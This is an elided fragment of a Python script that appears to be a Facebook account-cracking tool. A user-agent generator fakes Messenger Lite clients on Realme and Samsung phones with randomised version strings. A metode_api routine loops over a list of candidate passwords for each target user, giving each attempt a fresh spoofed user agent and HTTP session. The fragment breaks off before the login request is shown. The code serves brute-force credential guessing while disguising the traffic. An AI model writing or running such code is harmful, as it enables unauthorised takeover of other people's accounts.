...
def usera():
	...
	ua_realme = f"Mozilla/5.0 (Linux; Android {versi_android}; {realme} Build/{build}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Realme;FBBD/Realme;FBDV/{realme};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	ua_samsung = f"Mozilla/5.0 (Linux; Android {versi_android}; {samsung} Build/{build}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/Samsung;FBBD/Samsung;FBDV/{samsung};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
	...
	def metode_api(self,user,pwx):
		...
		for pw in pwx:
			try:
				pw = pw.lower()
				ua = usera()
				#ua = "Mozilla/5.0 (Linux; Android 5.0.2; SM-G925F Build/LRX22G) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
				ses = requests.Session()
